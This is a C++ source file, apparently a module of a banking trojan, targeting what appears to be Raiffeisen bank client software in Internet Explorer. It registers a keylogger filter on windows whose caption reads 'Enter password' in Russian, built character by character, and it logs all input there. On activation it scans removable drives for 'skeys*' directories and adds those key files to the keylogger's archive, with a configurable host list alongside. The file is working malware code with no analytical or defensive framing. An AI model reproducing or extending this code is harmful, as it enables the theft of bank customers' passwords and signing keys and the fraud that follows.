#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "rafa.h"

static char RAFA_HOSTS[RAFAHOSTS_PARAM_SIZE] = RAFAHOSTS_PARAM_NAME;

#include "RafaDll.cpp"

namespace Rafa {

	PCHAR Hosts()
	{
		return RAFA_HOSTS;
    }


	void AddFiles(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel) {
		// Добавляем директорию в архив кейлогера
		KeyLogger::AddDirectory(FileName, Search->cFileName);

		Cancel = true;
		*(bool*)Data = true;
	}

	void SearchRafaFiles(PCHAR Drive, LPVOID Data, bool &Cancel) {
		char D = *Drive;
		if (D == 'a' || D == 'A' || D == 'b' || D == 'B')
			return;

		bool C = false;
		SearchFiles(Drive, "skeys*", false, FA_DIRECTORY, &C, AddFiles);
		Cancel = C;
	}

	void CopyRafaKeyFiles(LPVOID Sender)
	{

#ifdef RafaDllModule
		InitHook_FilialRConDll();
#endif
		// Функция обработчик инициализации системы rafa
		// Добавляет в архив кейлогера файлы ключей
		EnumDrives(DRIVE_REMOVABLE, SearchRafaFiles, NULL);

	}

	void Init()
	{
		PKeyLogSystem S;

		 S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
		if (S != NULL)
		{
			char RafaCaption[] = {
				'В', 'в', 'е', 'д', 'и', 'т', 'е', ' ', 'п', 'а', 'р', 'о', 'л', 'ь', 0 };

			char RafaClass[] = {'V','C','o','n','t','r','o','l','*', 0};

			S->OnActivate   = Rafa::CopyRafaKeyFiles;
			PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, RafaClass, (PCHAR)RafaCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
		}
	}
}

